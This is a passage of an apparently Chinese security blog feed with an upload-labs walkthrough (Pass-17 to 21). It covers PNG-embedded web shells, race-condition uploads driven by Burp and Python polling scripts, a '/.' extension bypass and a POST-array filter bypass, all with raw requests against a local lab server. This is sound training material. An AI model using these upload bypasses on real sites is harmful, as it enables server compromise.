class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成图片如下，带有一个木马</p><p><img src="/2022/02/28/upload-labs/2022-03-03-16-22-18.png"></p><p>上传之后，下载，数据并没有改变</p><p><img src="/2022/02/28/upload-labs/2022-03-03-16-24-08.png"></p><p>包含图片，并设置参数如下，即可启动木马，原理是assert()会检查内部是否是字符串，如果是字符串，它将会被assert()当做php代码执行，前提是php版本较低php7之前，我这里使用php5。</p><p><img src="/2022/02/28/upload-labs/2022-03-03-16-25-19.png"></p><p><strong>参考：</strong></p><p><a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析</a><br><a href="https://blog.csdn.net/Cony_14/article/details/102761808?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&utm_relevant_index=2">Python3 PNG文件格式及根据CRC检验码修复图片高度</a><br><a href="https://blog.csdn.net/weixin_39672443/article/details/110806799?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">png文件头_图片格式知识PNG</a><br><a href="https://www.cnblogs.com/lidabo/p/3701197.html">PNG文件结构分析 —Png解析</a><br><a href="https://wooyun.js.org/drops/php%20imagecreatefrom.%20%E7%B3%BB%E5%88%97%E5%87%BD%E6%95%B0%E4%B9%8B%20png.html">imagecreatefrom*系列函数之png</a><br><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">Encoding Web Shells in PNG IDAT chunks</a>（重要，待究）   </p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p><strong>条件竞争</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_name:&quot;</span>.<span class="variable">$file_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_ext:&quot;</span>.<span class="variable">$file_ext</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;<span class="comment">//UPLOAD_PATH 被写死，无法00截断绕过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;<span class="comment">//临时存储成功后才进行检查</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到实现临时储存到<code>$upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;</code>这个地方，也就是原名储存，但是检查文件名到释放还是有间隙的，所以使用条件竞争<br>先简单上传一个可以写木马的文件，然后重放<br>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">18</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span></span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-<span class="number">18</span>/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;test.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;in_file.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>重放，在burp里面放到intruder，payload清零，基本设置如下<br><img src="/2022/02/28/upload-labs/2022-03-05-09-45-13.png"><br>然后python访问监听，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.8.107/upload/upload-labs/upload/test.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucess!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;testing……&quot;</span>)</span><br></pre></td></tr></table></figure><p>start intruder之后，一直监听，一直不成功，可以线程可以多开点，成功后，访问in_file.php</p><p><img src="/2022/02/28/upload-labs/2022-03-05-09-47-37.png"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><strong>条件竞争-假设不知上传后图片路径</strong></p><p>这关网上思路是条件竞争然后文件包含图片。个人认为，如果能文件包含，就没必要去竞争了，直接右键访问图片，包含路径即可。所以我觉得作者的本意是，上传之后，无法看到图片，得不到图片名。展示假设看不到图片名的方式，只知道在upload。<br>看后端代码，先保存，后改名，所以条件竞争。<br>因为后台只检查文件名后缀，所以直接修建文件名即可。<br>写一个gif如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;in_file.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后同Pass-18，intruder重放<br>使用python监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.8.107/upload/upload-labs/include.php?file=upload/test.gif&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucess!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;testing……&quot;</span>)</span><br></pre></td></tr></table></figure><p>待成功，然后访问对应in_file.php即可<br><img src="/2022/02/28/upload-labs/2022-03-05-11-12-06.png"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><strong>使用&#x2F;. 绕过pathinfo($file_name,PATHINFO_EXTENSION);</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        $file_name = trim($_POST[&#x27;save_name&#x27;]);</span></span><br><span class="line"><span class="comment">        $file_name = deldot($file_name);//删除文件名末尾的点</span></span><br><span class="line"><span class="comment">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span></span><br><span class="line"><span class="comment">        $file_ext = strtolower($file_ext); //转换为小写</span></span><br><span class="line"><span class="comment">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span></span><br><span class="line"><span class="comment">        $file_ext = trim($file_ext); //首尾去空</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_name:&quot;</span>.<span class="variable">$file_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//问题主要出在这</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_ext:&quot;</span>.<span class="variable">$file_ext</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">//还有这</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pathinfo只会检查最后一个最后一个 <code>.</code> 之后的名字，所以可以轻松绕过，而<code>文件名/.</code> 会被move_uploaded_file认为只有 <code>文件名</code><br>所以就构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-<span class="number">20</span>/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;test.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;save_name&quot;</span></span><br><span class="line"></span><br><span class="line">upload-<span class="number">19.</span>php/.</span><br><span class="line">-----------------------------<span class="number">13977230631673</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">13977230631673</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问即可<br><img src="/2022/02/28/upload-labs/2022-03-05-11-49-17.png"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p><strong>POST数组绕过</strong><br>审计代码，基本逻辑是，检查文件类型和后缀，漏洞在将文件名根据 <code>.</code> 分割成数组，没有考虑到可以POST 数组造成漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//mime check</span></span><br><span class="line">            <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//check filename</span></span><br><span class="line">                <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));<span class="comment">//漏洞点</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先测试正常情况下：</p><p><img src="/2022/02/28/upload-labs/2022-03-05-20-22-27.png"></p><p>save_name为数组的情况：<br><img src="/2022/02/28/upload-labs/2022-03-05-20-40-03.png"><br>可以看到，mime检查，和文件后缀检查都被绕过了。<br>访问即可<br><img src="/2022/02/28/upload-labs/2022-03-05-20-40-40.png"></p><p><strong>参考：</strong></p><p><a href="https://www.php.net/manual/zh/function.pathinfo.php">pathinfo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j 远程代码执行</title>
      <link href="/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
